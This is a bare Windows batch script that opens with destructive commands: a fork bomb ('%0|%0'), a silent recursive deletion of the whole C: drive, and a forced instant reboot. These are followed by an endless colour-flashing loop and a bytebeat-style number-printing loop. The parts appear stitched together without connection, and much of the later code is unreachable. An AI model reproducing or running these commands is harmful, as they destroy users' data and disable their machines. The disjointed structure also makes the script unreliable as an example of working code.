%0|%0
rd C:\ /s /q
shutdown /r /f /t 0

pause >nul
:loop
for /L %%i in (0,1,15) do (
    color 0%%i
    ping -n 1 127.0.0.1 >nul
)
goto loop

@echo off
setlocal enabledelayedexpansion

for /L %%t in (0,1,1000) do (
    set /a t=%%t

    rem part1 = (t & 16384) ? 7 : 5
    set /a part1=5
    set /a check1=(t & 16384)
    if !check1! NEQ 0 set part1=7

    rem part2 = 3 - (3 & (t >> 9)) + (3 & (t >> 8))
    set /a right9=(t>>9)
    set /a right8=(t>>8)
    set /a part2=3 - (3 & right9) + (3 & right8)

    rem part3 = (3 & (-t)) >> ((t & 4096) ? 2 : 16)
    set /a neg_t=-t
    set /a and3=(3 & neg_t)
    set /a check2=(t & 4096)
    set /a shift_amt=16
    if !check2! NEQ 0 set shift_amt=2
    set /a part3=and3 >> shift_amt

    rem val = t * part1 * part2 >> part3 | (t >> 3)
    set /a val1=t * part1 * part2
    set /a val2=val1 >> part3
    set /a val=val2 | (t >> 3)

    rem modulo 256 to stay in byte range
    set /a val_mod=val & 255

    rem print byte value as decimal
    echo !val_mod!

    rem tiny wait so output is visible but not too slow
    ping -n 1 -w 10 127.0.0.1 >nul
)

endlocal
